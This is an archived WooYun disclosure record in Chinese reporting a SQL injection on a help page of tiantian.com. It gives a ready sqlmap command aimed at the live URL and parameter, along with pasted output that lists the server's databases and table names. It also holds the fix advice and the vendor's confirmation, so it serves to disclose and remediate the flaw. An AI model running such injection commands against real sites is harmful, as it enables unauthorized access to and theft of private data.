{"id": 56099, "wybug_id": "wooyun-2014-058912", "wybug_title": "天天网某站SQL注入可导致多个数据库数据泄漏", "wybug_corp": "tiantian.com", "wybug_author": "her0ma", "wybug_date": "2014-05-01 10:21", "wybug_open_date": "2014-06-15 10:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向公众公开  简要描述： 天天网(http://www.tiantian.com)某站存在SQL注入漏洞，可以导致多个数据库的数据泄漏。 详细说明：  存在漏洞的站点：http://help.tiantian.com；具体的漏洞页面：http://help.tiantian.com/resp/pensong.aspx；是post类型的，具体的漏洞参数：t=gshi&v=6    参数v存在问题；SQLMAP注入测试命令：sqlmap.py -u \"http://help.tiantian.com/resp/pensong.aspx\" --data=\"t=gshi&v=6\" -p \"v\" --tables -D newsite --risk 5 --level 5如图所示：\n\n   漏洞证明：  数据库列表：\nweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008available databases [17]:[*] CPS_Log[*] CPS_Union[*] DBAdmin[*] master[*] model[*] msdb[*] newsite[*] NewSite_Action[*] NewSite_Archive[*] NewSite_Biz[*] NewSite_His[*] NewSite_Wireless[*] SiteBase[*] tempdb[*] tuan_sub[*] WMSys_SKU_sub[*] WMSys_sub\n当前库表名如下：\nweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008Database: newsite[640 tables]+----------------------------------------+| Action_CouponValidate_Log              || Action_Lottery_Account_Integral_Log    || Action_Lottery_Account_Send_Info       || Action_Lottery_Common                  || Action_Lottery_Common_Log              || Action_Lottery_True_Items_Send         || Action_MeiTuanTemp_UserInfo            || Active_PromoteList                     || Activities_Colif                       || Activities_DetailsRules                || Activities_Main                        || Activities_OtherRules                  || ActivityPosition                       || Activity_DayCount                      || Activity_Name                          || Activity_Product                       || Activity_User                          || Analysis_UserRegistered                || Answer_Vote                            || App_Base_ProductInfo                   || AutoKeywords                           || AutoKeywordsDetails                    || BPS_ActivityLog                        || Base_Action_Lottery_True_Items         || Base_CardEndNum                        || Base_CityRelation                      || Base_ProductInfo                       || Base_ProductInfo_Extend                || Base_ProductRecord                     || Base_ProductSalePrice                  || Base_ProductType                       || Base_ProductType_Extend                || Base_Product_PriceContrast             || Base_UserInfo_Extend                   || Base_illegalWords                      || Bind_User                              || Bind_UserCard                          || BindingProductDetails                  || BindingProductMain                     || Bizviva_ExpressTypeInfo                || Bizviva_Media                          || Bizviva_ProductInfo                    || BlackList                              || Brand_UserCardFor                      || Brand_imgInfo                          || CMS_TemplateContent_Input              || CPC_Activity                           || CPC_Search                             || CPM_Activity                           || CPM_Search                             || CallCenter_CustomerList                || CallCenter_PhoneBatch                  || CallCenter_PhoneList                   || CallCenter_PhoneRecord                 || CallCenter_PhoneVisitList              || CallCenter_ReservationTask             || CallCenter_UserAnswer                  || CallCenter_UserBrand                   || Cancel2money                           || CancelList                             || CardBrand                              || CardRule                               || CardTemp                               || CardTypeExchange                       || CardUsed_DayCount                      || CardUser                               || Card_Mobile                            || CartCacheBaseObject_Log                || CartCacheObject_Log                    || ChannelTuan_ActiveInfo                 || Com_CCProblem                          || Com_Department                         || Com_Question                           || Com_Study                              || Com_WorkNote                           || Com_topic                              || Comment_Star                           || Comment_useIP                          || Commentlist_Extend                     || Content_Management                     || Cooperation_API_ProductType            || Cooperation_API_ProductType_Relation   || Coupon_Cancel                          || CreateOrderStepRecover                 || CreateOrderinfoTimeTest                || DM_zpinfo                              || DP_Coupon                              || DP_Orderinfo                           || DianPing_Base_CityRelation             || DianPingtuan_Input_Excel_Order         || DisableIP                              || EDM_activity                           || EDM_search                             || EDM_user                               || Email_ActivationRecord                 || ErrorOrder                             || ErrorOrderRecord                       || ExpressDetailsCity                     || ExpressMainInfo                        || ExpressTypeInfo                        || FBA_Oitem                              || FBA_Orderinfo                          || FeedBack                               || FreeOrder_UserList                     || Free_Product                           || Free_Product_DM                        || From_ActivityList                      || From_ActivityProductList               || From_Advertisers                       || From_MediaFlow                         || Ftuan_Base_CityRelation                || Ftuan_Input_Excel_Order                || GM_Input_Excel_Order                   || GetPassword                            |\nwooyun上传图片功能挂掉的节奏，所以只好复制了。   修复方案：  1，对参数v进行类型判断，过滤；2，SQL语句不要拼接，使用存储过程；   版权声明：转载请注明来源 her0ma@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-05-04 10:33 厂商回复： 留个在线联系的方式，发放小礼物 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}